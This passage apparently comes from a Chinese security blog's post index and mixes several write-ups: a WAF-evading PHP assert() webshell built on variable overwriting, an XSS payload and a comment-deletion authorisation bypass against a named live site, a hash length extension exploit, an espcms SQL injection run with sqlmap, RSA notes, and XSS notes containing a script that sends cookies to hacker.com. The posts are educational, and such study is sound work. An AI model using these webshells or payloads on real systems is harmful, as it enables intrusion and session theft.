可以看到我们之前并未声明过a、b、c变量，但是仍可输出。 3.parse_str()定义：把查询字符串解析到变量中语法：parse_str(string,array)string为必选参数array为可选参数举个例子 可以看到此函数将name和age初始化成了变量，且值为等号右边的值当array参数存在时： 4.import_request_varibles()定义将 GET/POST/Cookie 变量导入到全局作用域中此函数相当于开启全局变量注册语法import_request_variables(string $types ,string $prefix )第一个参数为必选第二个参数为可选例子：import_request_variables(“GPC”)使用此方法即可开启对_POST、_GET、_COOKIE的全局变量注册当第二个参数存在时将会加上一个前缀 三、经典案例1.经典$$变量覆盖1234foreach(array('_COOKIE','_POST','_GET') as $_request) { foreach($$_request as $_key =&gt; $_value) { $$_key = addslashes($_value); } 这是一段非常经典的$$注册变量导致的变量覆盖代码，很多应用上都出现过可以看出$_key为COOKIE POST GET中的参数比如提交?a=1 则$_key的值为a而下面的$$_key则会有$a的意思，结合起来就变成了$a = addslashes($_value)这样便会覆盖原有的变量a的值我们来运行一下： 可以看到变量a被我们覆盖掉了 2.部分cms变量覆盖案例：MetInfo全局变量覆盖另类突破防注入http://www.weixianmanbu.com/article/84.html齐博CMS变量覆盖导致sql注入漏洞http://bobao.360.cn/learning/detail/291.htmlDestoon 20140530最新版超全局变量覆盖导致的安全问题http://0day5.com/archives/1855/ 四、变量覆盖玩出新花样之一句话木马bypass某狗经过我们简单的测试，我们可以了解到：当我们使用assert函数时，如果函数的参数是可控，那么某狗拦截。例如:assert($_POST[a])或者$a=$_POST[c];assert($a)这些都是拦截 但是如果我们只有assert($a)这一句时，我们发现他就不会进行拦截了 这就值得我们思考了，为什么这样不会拦截呢？我认为应该是某狗觉得这个变量a是不可控的，所以就认为这不是木马那如果这时我们在联系一下变量覆盖漏洞呢？在这里我选用了上面的案例代码 12345foreach(array('_COOKIE','_POST','_GET') as $_request) { foreach($$_request as $_key =&gt; $_value) { $$_key = addslashes($_value); }} 把addslashes()删掉 然后把代码精简下1foreach(array('_POST') as $_r){foreach($$_r as $_k =&gt; $_v) {$$_k = $_v;}}最终代码为1&lt;?php foreach(array('_POST') as $_r){foreach($$_r as $_k =&gt; $_v) {$$_k = $_v;}};assert($a);?&gt;成功bypass","link":"/2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/"},{"title":"对RSA加密原理及其应用的简单研究","text":"前言又是打CTF遇到的考点，也不是啥新鲜玩意了，这东西属于密码学的范畴，不过却是学信安的同学必须掌握的内容。今天就来打算好好学学这RSA究竟是个怎样的东西，让CTF考了这么多遍至今仍是一道频率极高的考点。 正文我们都知道，对于数字届来说，质数无遗是一种十分特殊的存在。他不会被除了1和他自身之外的正整数给整除，即他的因子只有1和他自己。而以目前的计算机算力来说，对于一个由两个1024位长的质数相乘得到的整数，想要反求他是由哪两个质数相乘而来实在困难重重。根据这一特性，RSA加密算法应运而生。 数学基础想要弄清楚RSA加密原理，就不得不提到一位数学家——欧拉。 这里主要围绕他最经典的欧拉定理来展开 欧拉定理（n为正整数，a为非零整数）： 推论1，若m，n为互斥的正整数，则如下式子成立： 推论2：设存在整数a,b满足如下定义： 故ab相乘得到： 可推出： 又因为： 故： 且由于： 故得到： RSA过程 选取两个质数p、q 计算n=q*p（RSA密钥位数即为n的二进制表示位数） 根据公式算出大于0小于n且与n互质的整数个数 选取一个正整数e且与(p-1)*(q-1)互质 由模反运算求出整数d： 此时我们的基本准备工作就做好了。 对于需要加密的明文m来说，可根据如下公式得到密文c： 而对于密文c来说，可根据下边的公式得到明文m： 公式验证让我们来证明该方程组的正确性。 由上文的模反运算可得： 故而： 又因为： 所以： 综上所述： 又因为： 进而得到： 我们令： 则可得到： 等式方程组成立。 安全性探讨在上述方程组中，(n,e)为公钥，(n,d)为私钥。公钥为公开状态，可供用户端进行加解密，私钥为私密状态，供服务端加解密。 对于流量嗅探来说，攻击者获取到受害者发送的流量，此时的数据在上述方程来说为c，除此之外攻击者还知道的值有：n与e。 对于式子由于无法知道与余数c有关的商为多少，所以也无法得知m^e的值，故而无法求出m。 而对于式子来说，私钥d是关键，如果d能被攻击者成功找到，那么数据m自然也是轻松算出。 私钥d是有模反运算得出的，由上文，我们知道： 其中k为任意正整数。若想得到私钥d，就得想办法算出的值。 其中n在公钥内已给出，而剩下的内容就是计算。 若在已知p和q的前提下，由公式： 可以很方便的计算出该值。 若在不知道p和q的前提下，则只能通过其定义进行计算与因数分解找出p和q两种办法，前者具体指的是找出大于0小于n且与n互质的整数个数。 这两种方法以当前计算机的发展来看，在n极大且未有解的情况下，需要难以估计的计算机算力去花费很长时间运算才有可能计算出来，故而可以认为该值在不知道质数p和q值的情况下是不可能算出来的。 故而在不知道私钥d的情况下，可以认为数据m是安全的，无法被窃取与串改。 RSA的应用SSL证书关于RSA的应用，我觉得SSL证书肯定是得讲讲的。简单的说，我们的操作系统内部内置由一些权威的CA证书机构的根证书(Root CA)。一个网站如果想要申请SSL证书(CA证书的一种)来保护自己用户的隐私，就需要向这些证书机构的代理商申请/购买证书，并需要验证网站的拥有者权限后才能成功获得SSL证书。 此证书通常包含格式为pem的证书文件（内容证书信息与证书公钥）与格式为key的私钥文件。 网站站长在部署SSL证书时候，当用户访问https://www.example.com/时，首先会判断是否下载过含公钥的证书，若没有下载，则与服务器通信将证书下载回本地。用户浏览器在使用证书里的公钥加密前会通过证书信息的内容向SSL证书发行链向上验证，判断当前SSL证书的合法性，此内容不在本文讨论范畴，感兴趣的读者可自行查阅资料。 当用户证书验证合法之后，浏览器会将流量与公钥进行加密运算，确保传输过程中的数据安全。 APP签名在一些封闭的手机环境，如IOS。用户无法安装费AppleStore的应用，原因就在于苹果系统内置了一份公钥，而在你想要安装新应用的时候，会去尝试使用这份公钥去解密APP内由AppleStore颁布的签名，此签名由苹果绝密的私钥生成，若签名正确，则代表此应用来自AppleStore，属于正常应用，允许用户安装，否则会禁止用户安装此应用，一定程度上确保用户的手机安全。 后记非对称算法里边RSA应该算是比较好学习的了，不仅在日常中应用广泛，近年来各种CTF也有相应的题目，可谓是不可不学。由于笔者是个纯web狗，第一次写这类文章，若出现什么错误，欢迎指正，感谢。 参考 RSA算法研究 RSA算法原理（二）","link":"/2020/%E5%AF%B9RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E7%9A%84%E7%AE%80%E5%8D%95%E7%A0%94%E7%A9%B6/"},{"title":"对回形针paperclip站点的安全测试","text":"前言先简单的介绍一下自己，Yunen，重庆大学大二信安在读生，是回形针paperclip的粉丝，对网络安全方面感兴趣，这次看到了回形针弄了自己的科普网站，打算利用自己的知识，给予回形针一点点小帮助:) 测试前台搜索框XSS使用特殊单词test123，先查看页面的输出点： 可以看到页面有5个输出点，先把每个输出点都看一下: 发现输出点全部被引号给包围了起来，我们尝试跳出引号的限制。 首先尝试&quot;双引号。发现全部的输出点都进行了转码的处理(其中form表单转成utf-8编码，其他均为html实体编码) 接着尝试'单引号，发现在此处，单引号可以成功跳出限制。 通过查看网页的源代码可知：此处对于href属性的限制使用的是单引号。 接下来就可以很容易的构造利用的payload： 1https://ipaperclip.net/doku.php?do=search&amp;id=start&amp;sf=1&amp;q=test1%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3Cimg%3E%3Cp tip此处还有第二个利用点 通过查看网页源代码知道：此处甚至没有使用引号进行包围： 不过此处可被利用的前提是：搜索的结果不为空。 因为只有这样，页面才会有跳转表单的代码。 估计只有等回形针做了关于web安全的科普才有可能得以利用得上。 PS：我在编辑指南之中疑似看到了可以插入html代码，不过我并没有进行测试。 网站绝对路径泄露 越权1）疑似可控制只读页面上传文件(未进行尝试)： 1https://ipaperclip.net/lib/exe/mediamanager.php?ns=wiki::%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E7%BC%96%E8%BE%91%E4%B8%80%E4%B8%AA%E6%9D%A1%E7%9B%AE&amp;edid=wiki__text 2）越权删除他人评论 这里选择一条删除不影响的评论作为演示 右键审查元素查看回复按钮的源代码，可获取其对应的cid。 抓取删除自己评论的数据包，并将其替换发送。 成功删除（注意发表时间）： 公开漏洞利用由于时间关系，这里只测试了一个比较新的公开漏洞。其他请自测:) 用户名枚举 结语此次测试花费一个小时左右，由于网站的用户交互处并不多，且原站点程序相对比较成熟，故对于黑盒测试来说，可以进行测试的点其实并不是很多，再加上我个人能力有限，只找到了这些BUG。最后，祝回形针PaperClip越办越好。","link":"/2019/%E5%AF%B9%E5%9B%9E%E5%BD%A2%E9%92%88paperclip%E7%AB%99%E7%82%B9%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"title":"浅谈HASH长度拓展攻击","text":"前言最近在做CTF题的时候遇到这个考点，想起来自己之前在做实验吧的入门CTF题的时候遇到过这个点，当时觉得难如看天书一般，现在回头望去，仔细琢磨一番感觉也不是那么难，这里就写篇文章记录一下自己的学习的过程。 正文何为HASH长度拓展攻击？ 简单的说，由于HASH的生成机制原因，使得我们可以人为的在原先明文数据的基础上添加新的拓展字符，使得原本的加密链变长，进而控制加密链的最后一节，使得我们得以控制最终结果。 这里我们以MD5加密算法为例子。 MD5长度拓展攻击下面是个简单的PHP例子。 1234567891011121314&lt;?phpinclude &quot;flag.php&quot;;$secretKey = 'xxxxxx'; #xxx为未知内容，但长度已知为6。$v1 = $_GET['str'];$sign = $_GET['sign'];$token = md5($secretKey.$v1);if($v1 === 'test') { die($token); #token=2df51a84abc64a28740d6d2ae8cd7b16} else { if($token === $sign) { die($flag); }}?&gt; 在这个例子中，我们需要使得变量$token与我们输入的sign参数满足一致才会输出flag。 而由于我们无法知道变量$secretKey的内容，所以无法得到$token的值，故而看似是没有办法获取到flag的死局，而这时便轮到我们的拓展攻击来大显身手了。 MD5算法流程若想搞清楚原理，其算法的流程是必须了解的。不过我们无需去关心那些复杂的运算，只需要知道的大概的一个流程就OK了。 这里借一张神图： 摘自：哈希长度拓展攻击(Hash Length Extension Attacks) 看不懂也没关系，相信你看完我这篇文章后再返回来看这张图就很清晰明了了。 我们还是举个例子，对于字符串aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb（64个a、3个b）。长度为19个字符，且根据ASCII表，字符a、b的十六进制分别为0x61、0x62。 而我们知道，1位十六进制相当于4位二进制表示(16=2^4)。所以对于64个字符a的长度来说，其二进制长度为：字符长度*二进制位数2*十六进制转二进制位数拓展4=64*2*4=512。 对于MD5算法来说，我们需要将原数据进行分块处理，以512位个二进制数据为一块。”最后“一块的处理分为以下几种情况： 明文数据的二进制数据长度&lt;=448，填充padding(无意义占位)数据使其长度为448，再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。 448&lt;明文数据的二进制数据长度&lt;=512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。 两种情况如下图： 注意：每块数据的长度均为512位二进制，图中的数据我没有全都用二进制来表示，将明文数据分块之后就可以与向量进行运算了。 对于padding数据（长度不定）来说：首位二进制位1，其余位为0. 对于长度信息位（长度8Byte=64bit）来说，从低位向高位数，如上图的长度信息：f0 03 00 00 00 00 00 00即代表0x03f0，其对应的十进制为1008，即为64+62=126个字符的二进制位数(一个字符1Byte即8bit)。 对于MD5算法来说，有一串初始向量如下： 1234A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476 这串初始向量的值是固定的，作为与第一块数据运算的原始向量。 当这串向量与第一块数据块运算之后，得到了一串新的向量值，这串新的向量值接着与第二块数据块参加运算，直到最后一块数据块。 如下图所示： 而最后的MD5值就是这最后的向量串经过如下转换的结果。 如向量串： 1234A=0xab45bc01B=0x6a64bb53C=0x23ba8afeD=0x46847a62 先两两为一组进行组合，得到如下数据： 1234ab 45 bc 016a 64 bb 5323 ba 8a fe46 84 7a 62 再进行高低位互换，得到如下数据： 123401 bc 45 ab53 bb 64 6afe 8a ba 2362 7a 84 46 最终拼接得到MD5值：01bc45ab53bb646afe8aba23627a8446。 现在，让我们回到开始的那个例子。 对于MD5值：2df51a84abc64a28740d6d2ae8cd7b16。我们可以根据MD5与向量互转规则，将MD5转成md5($secretKey + &quot;test&quot;)的最终向量值（A’、B’、C’、D’）： 1234A'=0x841af52dB'=0x284ac6abC'=0x2a6d0d74D'=0x167bcde8 过程如图： 这时候我们修改$v1变量的内容为： 123&quot;test&quot; + [0x80 + (0x0)*45] + [0x50 + 0x0*7] + &quot;abc&quot;相当于:&quot;test&quot; + padding数据 + 长度数据 + &quot;abc&quot; 则上述过程则被延续成下图所示： 而对于上述运算过程来说，我们知道了倒数第二个向量串的内容和最后一个数据块，这样一来，最终的MD5值我们也可以自己通过MD5算法计算出来了。 拓展如同MD5算法那般分组后与向量运算的流程被统称为Merkle–Damgård结构。 而同样使用此结构的HASH算法还有：SHA1、SHA2等 hashpumphashpump是一个专门生成MD5长度拓展攻击payload的工具。 Github仓库：https://github.com/bwall/HashPump 安装方法： 123456#Linuxgit clone https://github.com/bwall/HashPump.gitapt-get install g++ libssl-devcd HashPumpmakemake install 安装好之后在终端里输入hashpump，回车即可： 以之前的例子为例，使用hashpump生成payload： 故我们的EXP即为（\\x用%代替）： 1/?str=test%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00P%00%00%00%00%00%00%00abc&amp;sign=bac6cb2d585d2de3f5f48f2759d2e5a7 成功读取FLAG： CTF相关CTF题可供练习： [De1CTF2019]SSRFMe 实验吧-让我进去 后记其实这个知识点确实不难，但是回看两年前的自己，那时候是真的完完全全看不懂看不明白，但是现在只花了十几分钟就可以说是掌握这个知识点了。原来我们不知不觉间也对知识的认知又提升了一个台阶，原先难如天书的内容现在看来也不过尔尔，原先看不到、接触不到的知识，现在也有信心能够去尝试去学习、去理解并掌握。学习本该如此，如攀登高山一般，只有开始攀登，才有机会看得到山脚下看不到的风景，也唯有不断攀登，才能看到更多更多风景。 参考 哈希长度拓展攻击(Hash Length Extension Attacks) hash长度扩展攻击","link":"/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"},{"title":"用易语言简单编写一款半自动URL采集工具","text":"前言前段时间需要通过搜索引擎采集一些目标站，找了以前自己收集的一些工具，发现大多都失效了，没失效的也不怎么好用，思考了一下，还是决定自己来弄一个，这里借鉴的是法克论坛URL采集工具，这款工具在我电脑上失效了，感谢前辈们的工具。 正文准备 易语言 精益模块 精益web浏览器支持库 精益web浏览器填表模块 编写首先是GUI部分，这里我们简单地规划出了浏览器操作区、配置区以及我们的输出区。 简单地规划出GUI之后开始编写我们的核心代码： 这里做了一些URL的处理，对于百度和搜狗这两个搜索引擎来说，他们的URL是经过处理的，不会直接显示在HTML内，故我们需要进行单独的访问并提取出真实URL。百度是返回的302跳转，真实URL在响应头的Location中，而搜狗是返回的200状态码，真实URL在页面内容中的script标签内。 由于易语言对于双引号的转义不太方便，这里我们为了方便选择使用长文本常量存储。 以及针对百度的特殊处理： 剩下就是一些把功能拼起来，这里就略过不表。 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118.版本 2.支持库 wke.支持库 spec.程序集 窗口程序集_启动窗口.程序集变量 采集状态, 逻辑型.程序集变量 搜索引擎取URL_正则, 文本型.程序集变量 Ajax状态, 逻辑型.子程序 取URL.参数 正则表达式, 文本型.局部变量 HTML源代码, 文本型.局部变量 取URL正则, 正则表达式类.局部变量 计次, 整数型.局部变量 URL, 文本型.局部变量 标记URL, 文本型, 静态.局部变量 miniblink填表, miniblink填表.局部变量 响应头, 文本型Ajax状态 ＝ 真HTML源代码 ＝ wke_Utf8ToAnsi (精易Web浏览器1.取网页源码 ())取URL正则.创建 (正则表达式, HTML源代码).计次循环首 (取URL正则.取匹配数量 (), 计次) URL ＝ 取URL正则.取子匹配文本 (计次, 1) .如果真 (计次 ＝ 1) .如果 (URL ≠ 标记URL) 标记URL ＝ URL miniblink填表.web_SetWebView (精易Web浏览器1.取WebView ()) miniblink填表.web_SetScrollTop (99999) .否则 跳出循环 () .如果结束 .如果真结束 .如果真 (搜索引擎_组合框.内容 ＝ “百度”) 网页_访问_对象 (URL, 2, , , , , 响应头, , 真, , , , , , ) URL ＝ 文本_取右边 (文本_取指定变量文本行 (响应头, 8), “Location: ”) .如果真结束 .如果真 (搜索引擎_组合框.内容 ＝ “搜狗”) 调试输出 (URL) URL ＝ 文本_取出中间文本 (到文本 (网页_访问_对象 (“https://www.sogou.com” ＋ URL, 0)), “&lt;a href=” ＋ #引号, #引号 ＋ “ id=”, 0, 假) .如果真结束 URL输出框.内容 ＝ URL输出框.内容 ＋ URL ＋ #换行符.计次循环尾 ().子程序 搜索引擎初始化, 文本型.参数 所选引擎, 文本型.参数 关键字, 文本型.如果真 (所选引擎 ＝ “Google”) 搜索引擎取URL_正则 ＝ #取URL正则表达式_Google 返回 (“https://www.google.com/search?q=” ＋ 关键字).如果真结束.如果真 (所选引擎 ＝ “百度”) 搜索引擎取URL_正则 ＝ #取URL正则表达式_百度 返回 (“https://www.baidu.com/s?wd=” ＋ 关键字).如果真结束.如果真 (所选引擎 ＝ “Bing”) 搜索引擎取URL_正则 ＝ #取URL正则表达式_Bing 返回 (“https://cn.bing.com/search?q=” ＋ 关键字).如果真结束.如果真 (所选引擎 ＝ “360搜索”) 搜索引擎取URL_正则 ＝ #取URL正则表达式_360搜索 返回 (“https://www.so.com/s?j=1&amp;q=” ＋ 关键字).如果真结束搜索引擎取URL_正则 ＝ #取URL正则表达式_搜狗返回 (“https://www.sogou.com/web?query=” ＋ 关键字).子程序 _开始采集_按钮_被单击.如果 (采集状态 ＝ 假 且 关键字_编辑框.内容 ≠ “”) 采集状态 ＝ 真 精易Web浏览器1.浏览网页 (搜索引擎初始化 (搜索引擎_组合框.内容, 关键字_编辑框.内容)) 开始采集_按钮.标题 ＝ “停止采集”.否则 采集状态 ＝ 假 开始采集_按钮.标题 ＝ “开始采集”.如果结束.子程序 __启动窗口_创建完毕.局部变量 输出, 文本型采集状态 ＝ 假Ajax状态 ＝ 假Initialize ().子程序 _精易Web浏览器1_文档就绪.参数 就绪框架ID, 整数型.如果真 (采集状态 ＝ 真) 取URL (搜索引擎取URL_正则).如果真结束.子程序 _精易Web浏览器1_URL被改变.参数 URL, 文本型.参数 所属框架ID, 整数型.局部变量 所选引擎, 文本型所选引擎 ＝ 搜索引擎_组合框.内容.如果真 (所选引擎 ＝ “百度” 且 Ajax状态 ＝ 真) 精易Web浏览器1.浏览网页 (URL) Ajax状态 ＝ 假.如果真结束 后记为什么要用易语言来编写？1、之前学过一点易语言，有基础 2、第三方优秀模块多，类似功能实现起来应该不难 3、精益论坛日活量高，大佬多且热心帮助他人 4、软件GUI可视化生成，懒狗必备 关于我与易语言之间易语言是我学的第一门”编程语言“，想起来还是我高一高二的事情，易语言带我进入的编程的世界（菜狗不会英语），我很感谢她，虽说她的名声并不好听，但在我看来，易语言亦如一把宝剑，能杀人亦能救人。不管黑猫白猫，能抓到老鼠的猫就是好猫，易语言有精益模块等非常优秀的第三方模块，以及日活量挺高且求助区活跃大佬多的精益社区，这么看起来也并非完全不推荐学习。","link":"/2020/%E7%94%A8%E6%98%93%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E7%BC%96%E5%86%99%E4%B8%80%E6%AC%BE%E5%8D%8A%E8%87%AA%E5%8A%A8URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/"},{"title":"读书笔记之CMS漏洞复现集合","text":"前言最近在看法师的代码审计企业级代码安全架构一书，打算对书中所列出的cms漏洞进行复现，无技术含量。 正文准备工作 1.phpstudy环境整合包2.各种cms安装包3.《代码审计企业级代码安全架构》4.Seay源代码审计系统 复现一之espcms注入漏洞漏洞文件位置：espcms\\adminsoft\\control\\citylist.php 可以看到这里有一个sql请求，并且请求中包含着变量$parentid。并且$parentid的赋值句子为 1$parentid = $this-&gt;fun-&gt;accept('parentid', 'R') 这里引用对象进行赋值我们查找accept这个自定义函数，看看是否有可能会有sql注入。可以看出这个函数是_用来通过$_POST、$_GET、$_COOKIE 三种方法来接收数据并保存为数组变量$var最后通过一个daddslashes()函数对数据进行单引号等字符的过滤但是我们前面所提到的sql语句中并不需要我们去闭合单引号，那么这句造成了一个sql注入漏洞我们来找一下那些文件实例化了这个类这个类名叫important，我们直接进行全局搜索可以看到在adminsoft\\index.php文件实例化了该类Tips: 1234$control = new important();//实例化important类$action = 'on' . $action;//'变量赋值'if (method_exists($control, $action)) {//检测方法是否此名字 $control-&gt;$action();//如果存在则使用important类中的方法 成功注入用sqlmap测试一下因为该漏洞需要登录，即需要cookie验证，我们用burpsuite抓下数据包，并保存到sqlmap目录下的1.txt里，然后再用sqlmap，输入命令 1python2 sqlmap.py -r 1.txt 总结此漏洞涉及到php编程中的面向对象问题、addslashes()函数等知识点，比较基础","link":"/2018/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bespcms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"前端Hack之XSS攻击个人学习笔记","text":"简单概述 此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com) 1) 什么是XSS?   XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。       如果对以上描述还不是很了解的话，可以参考百度百科       在余弦大大和xisigr大大的书籍《Web前端安全技术揭秘》第三章中这样说道： 跨站脚本的重点不在“跨站”上，而应该在“脚本”上…因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。        确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。 2) XSS可以带来哪些危害？       对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如： 网页挂马; 盗取Cookie; DoS攻击; 钓鱼攻击; 蠕虫攻击; 劫持用户web行为; 结合CSRF进行针对性攻击; ······ 这些都是可以利用XSS漏洞来达成的。 3) XSS类型目前的XSS总共可以分为三种类型： 反射型(也叫非持久型) 存储型(也叫持久型) DOM型 PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试) 反射型XSS反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)       由于篇幅问题，关于反射型XSS我就不做过多简述。       有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：记一次从DOM型XSS到RCE过程。 存储型XSS       存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。— 《XSS跨站脚本攻击剖析与防御》       存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。—《Web前端黑客技术揭秘》 DOM型XSS       许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识       DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在百度百科得到相应的解答。       DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。       在刺的《白帽子讲Web安全》是这样讲的： 通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。        举个简单的例子(来自《Web前端黑客技术揭秘》)：12345678&lt;html&gt;...&lt;script&gt;var a=document.URL;document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));&lt;/script&gt;...&lt;/html&gt;       把以上代码保存为1.html,然后打开浏览器访问http://127.0.0.1/1.html#a=test       我们知道这是个静态页面，而且#后边的内容并不会传给服务器。        可是这样就不会产生XSS漏洞了吗？如果我们访问http://127.0.0.1/.html#a=&lt;script&gt;alert(/xss/)&lt;/script&gt;       当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。       具体执行过程如图： 4) XSS的利用方式       前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。 Cookie窃取       Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：&lt;script&gt;alert(document.cookie)&lt;/script&gt;会弹出当前页面的cookie信息。        这里我们引入一个叫做“同源策略”的概念： 首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面http://www.a.com/index.html，域名是 www.a.com，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：       同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。       除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：       (1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB       (2) 无法读写非同源网页的 DOM       (3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）        ————引自晚风表哥在信安之路上的投稿文章《同源策略与跨域请求》        我们知道Cookie有如下常见的属性： Domain————设置关联Cookie的域名; Expires————通过给定一个过期时间来创建一个持久化Cookie; Httponly————用于避免Cookie被Javascript访问; Name————Cookie的名称; Path————关联到Cookie的路径，默认为/; Value————读写Cookie的值; Secure————用于指定Cookie需要通过安全Socket层传递连接;        并且Cookie也可以安装类型分为： 本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在; 内存Cookie————即储存在内存中，随浏览器的关闭而消失;        如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。       由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况 默认       默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取123&lt;script&gt;new Image().src=&quot;http://www.hacker.com/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt; 不同域       这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为本域。       例如有两个网站www.a.com和test.a.com且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从test.a.com获取到www.a.com的Cookie，可是如果www.a.com的Cookie值中的domain属性设置为父级域即a.com，就可以通过test.a.com的xss漏洞获取到www.a.com的Cookie值。 不同路径       这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在www.a.com/admin/index.php设置cookie值且不知道path，那么path默认为/admin/。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有/admin/目录下的javascipt才能读取前边设置的Cookie。 Http Only       HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。 利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。 利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。 感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39) Secure       Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。 P3P       HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。       我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。 B域设置A域Cookie       在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。 